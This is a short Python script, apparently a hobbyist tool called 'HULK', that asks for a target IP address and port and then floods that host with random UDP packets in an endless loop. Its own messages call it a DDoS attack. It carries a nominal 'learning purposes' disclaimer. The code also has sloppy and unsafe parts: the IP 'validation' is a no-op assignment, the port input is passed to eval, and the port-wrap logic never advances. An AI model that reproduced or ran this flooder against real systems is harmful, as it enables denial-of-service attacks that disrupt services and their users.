#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
#Banner :
print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: ifshamim                    *
    *                                              *
    ************************************************
    ************************************************
    *                                              *    
    *  [!] Disclaimer :                            *
    *  1. Don't Use For Personal Revenges          *
    *  2. Author Is Not Responsible For Your Jobs  *
    *  3. Use for learning purposes                * 
    *  4. Does HULK suit in villain role, huh?     *
    ************************************************
	''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] Give HULK A Target IP : ")
port = eval(input(" [+] Starting Port NO : "))
os.system("clear")
print('''
    ************************************************
    *            _  _ _   _ _    _  __             *
    *           | || | | | | |  | |/ /             * 
    *           | __ | |_| | |__| ' <              *
    *           |_||_|\___/|____|_|\_\             *
    *                                              *
    *          HTTP Unbearable Load King           *
    *          Author: IF Shamim                   *
    *                                              *
    ************************************************

	''')
try:
	validate = ip
	print(" ✅ Valid IP Checked..IEHF.. ")
	print(" [+] Attack Screen Loading ..IEHF..")
except ValidationError as exception :
	print(" ✘ Input a right url")

#Lets start our attack
print(" ")
print("    That's my secret Cap, I am always angry IEHF")
print(" " )
print(" [+] IEHF is attacking server " + ip )
print (" " )
time.sleep(5)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] IEHF Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [-] IEHF DDOS ATTACK STOPPED")
input(" Enter To Exit IEHF")
os.system("clear")
print(" [-] Dr. Banner is tired...")
time.sleep(2)
